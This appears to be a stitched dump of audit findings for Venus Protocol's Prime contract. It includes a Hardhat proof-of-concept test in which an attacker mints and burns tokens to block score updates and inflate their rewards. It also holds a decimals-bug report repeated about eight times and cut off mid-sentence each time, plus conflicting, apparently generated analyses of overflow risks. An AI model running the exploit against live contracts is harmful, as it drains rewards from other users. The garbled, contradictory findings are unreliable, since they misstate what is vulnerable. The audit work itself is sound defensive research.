alpha/multiplier, minting and burning a Prime token (this requires the attacker to have staked the minimum amount of XVS 90 days in advance). If the number of Prime tokens minted is often at the max number of Prime tokens minted, the attacker could burn an existing token and then mint and burn a new one. Since the value of `!isScoreUpdated[nextScoreUpdateRoundId][user]` is default false, pendingScoreUpdates will be inappropriately decremented if the burned token was minted after the call to `updateMultipliers()`/`updateAlpha()`. \n\nAs aforementioned, the attacker can ensure that only other users' scores are updated until `pendingScoreUpdates` reaches zero, at which point further calls to `updateScores` will revert with the custom error `NoScoreUpdatesRequired()`.\n\nRelevant code from `updateScores()` for reference:\n```\n    function updateScores(address[] memory users) external {\n        if (pendingScoreUpdates == 0) revert NoScoreUpdatesRequired(); \n        if (nextScoreUpdateRoundId == 0) revert NoScoreUpdatesRequired();\n\n        for (uint256 i = 0; i < users.length; ) {\n            ...\n            pendingScoreUpdates--;\n            isScoreUpdated[nextScoreUpdateRoundId][user] = true;\n\n            unchecked {\n                i++;\n            }\n\n            emit UserScoreUpdated(user);\n        }\n    }\n```\nAs seen, the attacker's score can avoid being updated. This is signficant if a change in multiplier or alpha would decrease the attacker's score. Because rewards are distributed according to the user's score divided by the total score, the attacker can 'freeze' their score at a higher than appropriate value and accrue increased rewards at the cost of the other users in the market.\n\nThe attacker can also prevent score updates for other users. The attacker can 'freeze' a user's score that would otherwise increase after the alpha/multiplier changes, resulting in even greater rewards accrued for the attacker and denied from other users. This is because it is possible to decrease the value of `pendingScoreUpdates` by more than one if the attacker mints and burns more than one token after the alpha/multiplier is updated.\n\n## Math to support that a larger score results in greater reward accrual\nLet $a$ represent the attacker's score if it is properly updated after a change in alpha/multiplier, $b$ represent the properly updated total score, and $c$ represent the difference between the attacker's larger unupdated score and the attacker's smaller updated score. Clearly $a$, $b$, and $c$ are positive with $a < b$. Consider the following inequality, which holds true since $a<b$ :\n\n$\\frac{a+c}{b+c} > \\frac{a}{b} \\iff a+c > \\frac{a(b+c)}{b} \\iff a+c > a+\\frac{ac}{b}$\n## Test\nPaste and run the below test in the 'mint and burn' scenario in Prime.ts (line 302)\n```\n    it(\"prevent_Update\", async () => { //test to show attacker can arbitrarily prevent multiple users from being updated by `updateScores()`\n      //setup 3 users\n      await prime.issue(false, [user1.getAddress(), user2.getAddress(), user3.getAddress()]);\n      await xvs.connect(user1).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user1).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user2).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user2).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user3).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user3).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker sets up addresses to mint/burn and manipulate pendingScoreUpdates\n      const [,,,,user4,user5] = await ethers.getSigners();\n      await xvs.transfer(user4.address, bigNumber18.mul(1000000));\n      await xvs.transfer(user5.address, bigNumber18.mul(1000000));\n      await xvs.connect(user4).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user4).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user5).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user5).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await mine(90 * 24 * 60 * 60);\n      //change alpha, pendingScoreUpdates changed to 3\n      await prime.updateAlpha(1, 5);\n      //attacker backruns alpha update with minting and burning tokens, decreasing pendingScoreUpdates by 2\n      await prime.connect(user4).claim();\n      await xvsVault.connect(user4).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      await prime.connect(user5).claim();\n      await xvsVault.connect(user5).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker updates user 3, decreasing pendingScoreUpdates by 1\n      await prime.connect(user1).updateScores([user3.getAddress()])\n      //users 1 and 2 won't be updated because pendingScoreUpdates is 0\n      await expect(prime.updateScores([user1.getAddress(), user2.getAddress()])).to.be.revertedWithCustomError(prime, \"NoScoreUpdatesRequired\");\n    });\n```\n## Tools Used\nHardhat\n## Recommended Mitigation Steps\nCheck if `pendingScoreUpdates` is nonzero when a token is minted, and increment it if so. This removes the attacker's ability to manipulate `pendingScoreUpdates`.\n```diff\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) { //@Gas\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n+       if (pendingScoreUpdates != 0) {unchecked{++pendingScoreUpdates;}} \n\n        emit Mint(user, isIrrevocable);\n    }\n```\n## Further Considerations\nThe call to `updateMultipliers()` can be frontrun by the attacker with staking XVS and/or lending/borrowing transactions in order to increase the attacker's score before 'freezing' it.\n\nIf the attacker wants to keep the inflated score, no actions that update the attacker's score can be taken. However, the attacker can claim the outsized rewards earned at any time and as often as desired since `claimInterest()` does not update user scores.\n\nIf anyone has knowledge that the exploit has occurred, it is possible for any user's score in a market to be updated with a call to `accrueInterestAndUpdateScore()`, which can neutralize the attack.\n\nThe required amount of XVS staked for this exploit can be reduced by 1000 if this exploit is combined with the exploit titled \"Irrevocable token holders can instantly mint a revocable token after burning and bypass the minimum XVS stake for revocable tokens\".\n\n\n## Assessed type\n\nOther",

After that `capital` is used in `Scores.calculateScore` function.\nNote: `capital` precision from  function is in precision of **underlying token decimals**.\n\n\n\n```solidity\n    (uint256 capital, , ) = _capitalForScore(xvsBalanceForScore, borrow, supply, market);\n    capital = capital * (10 ** (18 - vToken.decimals()));\n\n    return Scores.calculateScore(xvsBalanceForScore, capital, alphaNumerator, alphaDenominator);\n```\n\nThe mistake is made when `vToken.decimals()` is used instead of `vToken.underlying().decimals()`.\n&nbsp;\n\nTo prove that this is the case, here are vTokens deployed on Binance Smart chain, their decimals and underlying token decimals:\n\n| vToken                                                                        | vToken decimals | Underlying token decimals |\n| ----------------------------------------------------------------------------- | --------------- | ------------------------- |\n|  | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|  | 8               | 18                        |\n\nSince `vToken.decimals()` is used, this means the precision of `capital` is `18 + (18 - 8) = 28` decimals instead of 18 decimals, which makes the `score` calculation from  function incorrect, since the function expects `capital` to be in precision of 18 decimals.\n\nAs a result, `delta` for market's `rewardIndex` is incorrectly calculated and it can be 0 even though it shouldn't be, which means that users will not accrue any rewards.\n\n### Test\n\n#### 1. Update current test with correct decimals for vTokens\n\nDevelopers have made a mistake when writing the tests for `Prime.sol` - in the tests they have set vToken decimals to 18 instead of 8, which makes the tests pass, but on the Binance Smart Chain all of the vToken decimals are 8.\n\nIf the decimal value of vToken is set to 8 in the tests, then the tests will fail.\n\nChange the `vusdt`, `veth` and `vbnb` decimals to 8 and run:\n\n```bash\nnpx hardhat test tests/hardhat/Prime/*.ts tests/hardhat/integration/index.ts\n```\n\nThis will make the current tests fail.\n\n#### 2. PoC test\n\nHere is a test where it shows, that `rewardIndex` is still 0 after `Prime.accrueInterest` is called, even though it should be > 0.\n\n<details>\n<summary>PoC test</summary>\n\nTo run the following test:\n\n1. Create `PoC.ts` file under the `tests/hardhat/Prime` path.\n2. Copy the code below and paste it into the `PoC.ts` file.\n3.

After that `capital` is used in `Scores.calculateScore` function.\nNote: `capital` precision from  function is in precision of **underlying token decimals**.\n\n\n\n```solidity\n    (uint256 capital, , ) = _capitalForScore(xvsBalanceForScore, borrow, supply, market);\n    capital = capital * (10 ** (18 - vToken.decimals()));\n\n    return Scores.calculateScore(xvsBalanceForScore, capital, alphaNumerator, alphaDenominator);\n```\n\nThe mistake is made when `vToken.decimals()` is used instead of `vToken.underlying().decimals()`.\n&nbsp;\n\nTo prove that this is the case, here are vTokens deployed on Binance Smart chain, their decimals and underlying token decimals:\n\n| vToken                                                                        | vToken decimals | Underlying token decimals |\n| ----------------------------------------------------------------------------- | --------------- | ------------------------- |\n|  | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|  | 8               | 18                        |\n\nSince `vToken.decimals()` is used, this means the precision of `capital` is `18 + (18 - 8) = 28` decimals instead of 18 decimals, which makes the `score` calculation from  function incorrect, since the function expects `capital` to be in precision of 18 decimals.\n\nAs a result, `delta` for market's `rewardIndex` is incorrectly calculated and it can be 0 even though it shouldn't be, which means that users will not accrue any rewards.\n\n### Test\n\n#### 1. Update current test with correct decimals for vTokens\n\nDevelopers have made a mistake when writing the tests for `Prime.sol` - in the tests they have set vToken decimals to 18 instead of 8, which makes the tests pass, but on the Binance Smart Chain all of the vToken decimals are 8.\n\nIf the decimal value of vToken is set to 8 in the tests, then the tests will fail.\n\nChange the `vusdt`, `veth` and `vbnb` decimals to 8 and run:\n\n```bash\nnpx hardhat test tests/hardhat/Prime/*.ts tests/hardhat/integration/index.ts\n```\n\nThis will make the current tests fail.\n\n#### 2. PoC test\n\nHere is a test where it shows, that `rewardIndex` is still 0 after `Prime.accrueInterest` is called, even though it should be > 0.\n\n<details>\n<summary>PoC test</summary>\n\nTo run the following test:\n\n1. Create `PoC.ts` file under the `tests/hardhat/Prime` path.\n2. Copy the code below and paste it into the `PoC.ts` file.\n3.

After that `capital` is used in `Scores.calculateScore` function.\nNote: `capital` precision from  function is in precision of **underlying token decimals**.\n\n\n\n```solidity\n    (uint256 capital, , ) = _capitalForScore(xvsBalanceForScore, borrow, supply, market);\n    capital = capital * (10 ** (18 - vToken.decimals()));\n\n    return Scores.calculateScore(xvsBalanceForScore, capital, alphaNumerator, alphaDenominator);\n```\n\nThe mistake is made when `vToken.decimals()` is used instead of `vToken.underlying().decimals()`.\n&nbsp;\n\nTo prove that this is the case, here are vTokens deployed on Binance Smart chain, their decimals and underlying token decimals:\n\n| vToken                                                                        | vToken decimals | Underlying token decimals |\n| ----------------------------------------------------------------------------- | --------------- | ------------------------- |\n|  | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|  | 8               | 18                        |\n\nSince `vToken.decimals()` is used, this means the precision of `capital` is `18 + (18 - 8) = 28` decimals instead of 18 decimals, which makes the `score` calculation from  function incorrect, since the function expects `capital` to be in precision of 18 decimals.\n\nAs a result, `delta` for market's `rewardIndex` is incorrectly calculated and it can be 0 even though it shouldn't be, which means that users will not accrue any rewards.\n\n### Test\n\n#### 1. Update current test with correct decimals for vTokens\n\nDevelopers have made a mistake when writing the tests for `Prime.sol` - in the tests they have set vToken decimals to 18 instead of 8, which makes the tests pass, but on the Binance Smart Chain all of the vToken decimals are 8.\n\nIf the decimal value of vToken is set to 8 in the tests, then the tests will fail.\n\nChange the `vusdt`, `veth` and `vbnb` decimals to 8 and run:\n\n```bash\nnpx hardhat test tests/hardhat/Prime/*.ts tests/hardhat/integration/index.ts\n```\n\nThis will make the current tests fail.\n\n#### 2. PoC test\n\nHere is a test where it shows, that `rewardIndex` is still 0 after `Prime.accrueInterest` is called, even though it should be > 0.\n\n<details>\n<summary>PoC test</summary>\n\nTo run the following test:\n\n1. Create `PoC.ts` file under the `tests/hardhat/Prime` path.\n2. Copy the code below and paste it into the `PoC.ts` file.\n3.

After that `capital` is used in `Scores.calculateScore` function.\nNote: `capital` precision from  function is in precision of **underlying token decimals**.\n\n\n\n```solidity\n    (uint256 capital, , ) = _capitalForScore(xvsBalanceForScore, borrow, supply, market);\n    capital = capital * (10 ** (18 - vToken.decimals()));\n\n    return Scores.calculateScore(xvsBalanceForScore, capital, alphaNumerator, alphaDenominator);\n```\n\nThe mistake is made when `vToken.decimals()` is used instead of `vToken.underlying().decimals()`.\n&nbsp;\n\nTo prove that this is the case, here are vTokens deployed on Binance Smart chain, their decimals and underlying token decimals:\n\n| vToken                                                                        | vToken decimals | Underlying token decimals |\n| ----------------------------------------------------------------------------- | --------------- | ------------------------- |\n|  | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|  | 8               | 18                        |\n\nSince `vToken.decimals()` is used, this means the precision of `capital` is `18 + (18 - 8) = 28` decimals instead of 18 decimals, which makes the `score` calculation from  function incorrect, since the function expects `capital` to be in precision of 18 decimals.\n\nAs a result, `delta` for market's `rewardIndex` is incorrectly calculated and it can be 0 even though it shouldn't be, which means that users will not accrue any rewards.\n\n### Test\n\n#### 1. Update current test with correct decimals for vTokens\n\nDevelopers have made a mistake when writing the tests for `Prime.sol` - in the tests they have set vToken decimals to 18 instead of 8, which makes the tests pass, but on the Binance Smart Chain all of the vToken decimals are 8.\n\nIf the decimal value of vToken is set to 8 in the tests, then the tests will fail.\n\nChange the `vusdt`, `veth` and `vbnb` decimals to 8 and run:\n\n```bash\nnpx hardhat test tests/hardhat/Prime/*.ts tests/hardhat/integration/index.ts\n```\n\nThis will make the current tests fail.\n\n#### 2. PoC test\n\nHere is a test where it shows, that `rewardIndex` is still 0 after `Prime.accrueInterest` is called, even though it should be > 0.\n\n<details>\n<summary>PoC test</summary>\n\nTo run the following test:\n\n1.

        "gt": "\n# Vulnerability details\n\n## Impact\n\nUsers earned rewards are calculated incorrectly because of the incorrect decimals value used to calculate user's `score` and markets `sumOfMembersScore`, which impacts the `delta` that is added to market's `rewardIndex` when `Prime.accrueInterest` function is called.\n\n## Proof of Concept\n\nAll users rewards are calculated with the following formula:\n\n```\nrewards = (rewardIndex - userRewardIndex) * scoreOfUser;\n```\n\nThis means that for user to earn rewards, market's `rewardIndex` needs to periodically increase.\n&nbsp;\n\n`markets[vToken].rewardIndex` is updated (increased), when `Prime.accrueInterest` is called.\n\n\n\n```solidity\n    uint256 delta;\n    if (markets[vToken].sumOfMembersScore > 0) {\n        delta = ((distributionIncome * EXP_SCALE) / markets[vToken].sumOfMembersScore);\n    }\n\n    markets[vToken].rewardIndex = markets[vToken].rewardIndex + delta;\n```\n\nFrom the code snippet above it is assumed that `markets[vToken].sumOfMembersScore` is precision of 18 decimals.\n\nTo ensure that user's `score` and markets `sumOfMemberScore` are correctly calculated, in  function `capital` is adjusted to 18 decimals. After that `capital` is used in `Scores.calculateScore` function.\nNote: `capital` precision from  function is in precision of **underlying token decimals**.\n\n\n\n```solidity\n    (uint256 capital, , ) = _capitalForScore(xvsBalanceForScore, borrow, supply, market);\n    capital = capital * (10 ** (18 - vToken.decimals()));\n\n    return Scores.calculateScore(xvsBalanceForScore, capital, alphaNumerator, alphaDenominator);\n```\n\nThe mistake is made when `vToken.decimals()` is used instead of `vToken.underlying().decimals()`.\n&nbsp;\n\nTo prove that this is the case, here are vTokens deployed on Binance Smart chain, their decimals and underlying token decimals:\n\n| vToken                                                                        | vToken decimals | Underlying token decimals |\n| ----------------------------------------------------------------------------- | --------------- | ------------------------- |\n|  | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|  | 8               | 18                        |\n\nSince `vToken.decimals()` is used, this means the precision of `capital` is `18 + (18 - 8) = 28` decimals instead of 18 decimals, which makes the `score` calculation from  function incorrect, since the function expects `capital` to be in precision of 18 decimals.\n\nAs a result, `delta` for market's `rewardIndex` is incorrectly calculated and it can be 0 even though it shouldn't be, which means that users will not accrue any rewards.\n\n### Test\n\n#### 1. Update current test with correct decimals for vTokens\n\nDevelopers have made a mistake when writing the tests for `Prime.sol` - in the tests they have set vToken decimals to 18 instead of 8, which makes the tests pass, but on the Binance Smart Chain all of the vToken decimals are 8.\n\nIf the decimal value of vToken is set to 8 in the tests, then the tests will fail.\n\nChange the `vusdt`, `veth` and `vbnb` decimals to 8 and run:\n\n```bash\nnpx hardhat test tests/hardhat/Prime/*.ts tests/hardhat/integration/index.ts\n```\n\nThis will make the current tests fail.\n\n#### 2. PoC test\n\nHere is a test where it shows, that `rewardIndex` is still 0 after `Prime.accrueInterest` is called, even though it should be > 0.\n\n<details>\n<summary>PoC test</summary>\n\nTo run the following test:\n\n1. Create `PoC.ts` file under the `tests/hardhat/Prime` path.\n2. Copy the code below and paste it into the `PoC.ts` file.\n3.

The reason is that the function uses a fixed-point math library (FixedMath) that supports exponents in a fixed-point format, which is the recommended solution to avoid the vulnerability.\n\nThe function calculates a score based on two input values, xvs and capital, by applying a formula that involves exponents. To prevent overflows, the function uses two different formulas depending on the relationship between xvs and capital. Specifically, it uses the formula `capital * (xvs / capital)^\ud835\udf70` when xvs < capital and the formula `capital / (capital / xvs)^\ud835\udf70` when capital < xvs.\n\nTo ensure correct exponent handling, the function uses the FixedMath library to perform fixed-point arithmetic operations, including calculating the natural logarithm (ln), exponentiation (exp), multiplication (uintMul), and division (uintDiv). By using a library that supports exponents in a fixed-point format, the function avoids the vulnerability of incorrect exponent usage leading to integer overflow.\n\nIn summary, the function is not vulnerable to the given vulnerability because it uses a fixed-point math library that supports exponents in the desired format, ensuring accurate results and avoiding integer overflows.",

The code checks for the edge cases where `xvs` or `capital` is zero and returns zero immediately, which avoids division by zero errors.\n2. When `xvs` is equal to `capital`, the code returns `xvs` directly, which avoids unnecessary calculations.\n3. The code uses a variable `lessxvsThanCapital` to determine whether `xvs` is less than `capital` or not. Based on this value, it chooses the appropriate formula to avoid overflows and underflows.\n4. The code uses a custom `FixedMath` library, which likely has built-in checks for overflows and underflows during arithmetic operations, such as `FixedMath.toFixed()`, `FixedMath.exp()`, `FixedMath.uintMul()`, and `FixedMath.uintDiv()`.\n\nWhile I cannot provide a PoC or a patch for this specific code since it doesn't seem to have any vulnerabilities, it's worth noting that the developer has taken the necessary precautions to prevent integer overflows and underflows.",

After that `capital` is used in `Scores.calculateScore` function.\nNote: `capital` precision from  function is in precision of **underlying token decimals**.\n\n\n\n```solidity\n    (uint256 capital, , ) = _capitalForScore(xvsBalanceForScore, borrow, supply, market);\n    capital = capital * (10 ** (18 - vToken.decimals()));\n\n    return Scores.calculateScore(xvsBalanceForScore, capital, alphaNumerator, alphaDenominator);\n```\n\nThe mistake is made when `vToken.decimals()` is used instead of `vToken.underlying().decimals()`.\n&nbsp;\n\nTo prove that this is the case, here are vTokens deployed on Binance Smart chain, their decimals and underlying token decimals:\n\n| vToken                                                                        | vToken decimals | Underlying token decimals |\n| ----------------------------------------------------------------------------- | --------------- | ------------------------- |\n|  | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|  | 8               | 18                        |\n\nSince `vToken.decimals()` is used, this means the precision of `capital` is `18 + (18 - 8) = 28` decimals instead of 18 decimals, which makes the `score` calculation from  function incorrect, since the function expects `capital` to be in precision of 18 decimals.\n\nAs a result, `delta` for market's `rewardIndex` is incorrectly calculated and it can be 0 even though it shouldn't be, which means that users will not accrue any rewards.\n\n### Test\n\n#### 1. Update current test with correct decimals for vTokens\n\nDevelopers have made a mistake when writing the tests for `Prime.sol` - in the tests they have set vToken decimals to 18 instead of 8, which makes the tests pass, but on the Binance Smart Chain all of the vToken decimals are 8.\n\nIf the decimal value of vToken is set to 8 in the tests, then the tests will fail.\n\nChange the `vusdt`, `veth` and `vbnb` decimals to 8 and run:\n\n```bash\nnpx hardhat test tests/hardhat/Prime/*.ts tests/hardhat/integration/index.ts\n```\n\nThis will make the current tests fail.\n\n#### 2. PoC test\n\nHere is a test where it shows, that `rewardIndex` is still 0 after `Prime.accrueInterest` is called, even though it should be > 0.\n\n<details>\n<summary>PoC test</summary>\n\nTo run the following test:\n\n1. Create `PoC.ts` file under the `tests/hardhat/Prime` path.\n2. Copy the code below and paste it into the `PoC.ts` file.\n3.

After that `capital` is used in `Scores.calculateScore` function.\nNote: `capital` precision from  function is in precision of **underlying token decimals**.\n\n\n\n```solidity\n    (uint256 capital, , ) = _capitalForScore(xvsBalanceForScore, borrow, supply, market);\n    capital = capital * (10 ** (18 - vToken.decimals()));\n\n    return Scores.calculateScore(xvsBalanceForScore, capital, alphaNumerator, alphaDenominator);\n```\n\nThe mistake is made when `vToken.decimals()` is used instead of `vToken.underlying().decimals()`.\n&nbsp;\n\nTo prove that this is the case, here are vTokens deployed on Binance Smart chain, their decimals and underlying token decimals:\n\n| vToken                                                                        | vToken decimals | Underlying token decimals |\n| ----------------------------------------------------------------------------- | --------------- | ------------------------- |\n|  | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|  | 8               | 18                        |\n\nSince `vToken.decimals()` is used, this means the precision of `capital` is `18 + (18 - 8) = 28` decimals instead of 18 decimals, which makes the `score` calculation from  function incorrect, since the function expects `capital` to be in precision of 18 decimals.\n\nAs a result, `delta` for market's `rewardIndex` is incorrectly calculated and it can be 0 even though it shouldn't be, which means that users will not accrue any rewards.\n\n### Test\n\n#### 1. Update current test with correct decimals for vTokens\n\nDevelopers have made a mistake when writing the tests for `Prime.sol` - in the tests they have set vToken decimals to 18 instead of 8, which makes the tests pass, but on the Binance Smart Chain all of the vToken decimals are 8.\n\nIf the decimal value of vToken is set to 8 in the tests, then the tests will fail.\n\nChange the `vusdt`, `veth` and `vbnb` decimals to 8 and run:\n\n```bash\nnpx hardhat test tests/hardhat/Prime/*.ts tests/hardhat/integration/index.ts\n```\n\nThis will make the current tests fail.\n\n#### 2. PoC test\n\nHere is a test where it shows, that `rewardIndex` is still 0 after `Prime.accrueInterest` is called, even though it should be > 0.\n\n<details>\n<summary>PoC test</summary>\n\nTo run the following test:\n\n1. Create `PoC.ts` file under the `tests/hardhat/Prime` path.\n2. Copy the code below and paste it into the `PoC.ts` file.\n3.

Functionality: The given code calculates the borrow and supply caps for a user based on the user's XVS holdings, the market's borrow and supply multipliers, and the current prices of XVS and the underlying token.

Analysis: There are no signs of miscalculation or incorrect conversion of collateral values in this code. The code consistently uses the correct order of operations and precision factors.

In the `borrowCapUSD` and `supplyCapUSD` calculations, there is a multiplication of `xvsPrice` with `(xvs * markets[market].borrowMultiplier)` and `(xvs * markets[market].supplyMultiplier)` respectively. If the values of `xvsPrice`, `xvs`, and the multipliers are large, this multiplication could result in an arithmetic overflow.\n2. In the `supply` and `borrow` calculations, there is a multiplication of input values with the calculated caps. If the caps are larger than the maximum value that can be held by the `uint256` data type, this multiplication could result in an arithmetic overflow.\n\nThe vulnerability exists due to the absence of proper checks for arithmetic overflows in the multiplication operations. Although the code uses the `EXP_SCALE` constant to divide the results, it does not ensure that the intermediate results are within the safe bounds of the `uint256` data type.\n\nTo prevent this vulnerability, the code should utilize safe math operations that revert the transaction if an overflow would occur, or reduce the precision factors used in computations and perform multiplication in steps, checking for possible overflows at each stage. Additionally, the appropriate scaling of input variables should be considered to ensure that intermediate results remain within safe bounds for the data types used.",

In the `_capitalForScore` function, there are multiple multiplications involving `xvs`, `borrowMultiplier`, `supplyMultiplier`, `supply`, `borrow`, and `tokenPrice`.\n2. Without analyzing the exact values of these variables, it's impossible to prove that an overflow will occur. However, the potential for an overflow exists if the values are large enough.\n3. For instance, consider the following line:\n\n```solidity\nuint256 borrowCapUSD = (xvsPrice * ((xvs * markets[market].borrowMultiplier) / EXP_SCALE)) / EXP_SCALE;\n```\n\nIf `xvsPrice`, `xvs`, and `markets[market].borrowMultiplier` have large values, the intermediate multiplication can exceed the maximum capacity of `uint256`, causing an overflow.\n\nTo prevent this vulnerability, the developer should consider using safe math operations or reduce the precision factors used in computations. In this case, using a safe math library like OpenZeppelin's SafeMath could prevent overflows by reverting the transaction when an overflow would occur.

After that `capital` is used in `Scores.calculateScore` function.\nNote: `capital` precision from  function is in precision of **underlying token decimals**.\n\n\n\n```solidity\n    (uint256 capital, , ) = _capitalForScore(xvsBalanceForScore, borrow, supply, market);\n    capital = capital * (10 ** (18 - vToken.decimals()));\n\n    return Scores.calculateScore(xvsBalanceForScore, capital, alphaNumerator, alphaDenominator);\n```\n\nThe mistake is made when `vToken.decimals()` is used instead of `vToken.underlying().decimals()`.\n&nbsp;\n\nTo prove that this is the case, here are vTokens deployed on Binance Smart chain, their decimals and underlying token decimals:\n\n| vToken                                                                        | vToken decimals | Underlying token decimals |\n| ----------------------------------------------------------------------------- | --------------- | ------------------------- |\n|  | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|  | 8               | 18                        |\n\nSince `vToken.decimals()` is used, this means the precision of `capital` is `18 + (18 - 8) = 28` decimals instead of 18 decimals, which makes the `score` calculation from  function incorrect, since the function expects `capital` to be in precision of 18 decimals.\n\nAs a result, `delta` for market's `rewardIndex` is incorrectly calculated and it can be 0 even though it shouldn't be, which means that users will not accrue any rewards.\n\n### Test\n\n#### 1. Update current test with correct decimals for vTokens\n\nDevelopers have made a mistake when writing the tests for `Prime.sol` - in the tests they have set vToken decimals to 18 instead of 8, which makes the tests pass, but on the Binance Smart Chain all of the vToken decimals are 8.\n\nIf the decimal value of vToken is set to 8 in the tests, then the tests will fail.\n\nChange the `vusdt`, `veth` and `vbnb` decimals to 8 and run:\n\n```bash\nnpx hardhat test tests/hardhat/Prime/*.ts tests/hardhat/integration/index.ts\n```\n\nThis will make the current tests fail.\n\n#### 2. PoC test\n\nHere is a test where it shows, that `rewardIndex` is still 0 after `Prime.accrueInterest` is called, even though it should be > 0.\n\n<details>\n<summary>PoC test</summary>\n\nTo run the following test:\n\n1.

Specifically, in the following lines:\n\n- `uint256 borrowCapUSD = (xvsPrice * ((xvs * markets[market].borrowMultiplier) / EXP_SCALE)) / EXP_SCALE;`\n- `uint256 supplyCapUSD = (xvsPrice * ((xvs * markets[market].supplyMultiplier) / EXP_SCALE)) / EXP_SCALE;`\n- `uint256 supplyUSD = (tokenPrice * supply) / EXP_SCALE;`\n- `uint256 borrowUSD = (tokenPrice * borrow) / EXP_SCALE;`\n\nIf the product of the multiplications exceeds the maximum capacity of the `uint256` data type, it will result in an overflow. The overflow can cause the smart contract to revert the transaction or produce incorrect calculations, which can have broader implications such as rendering the market inoperative or freezing users' funds.\n\nTo prevent this vulnerability, the code should utilize safe math operations that revert the transaction if an overflow would occur. Alternatively, the code can reduce the precision factors used in computations or perform the multiplication in steps, checking for possible overflows at each stage. Additionally, the code should consider the appropriate scaling of input variables to ensure that intermediate results remain within safe bounds for the data types used.",
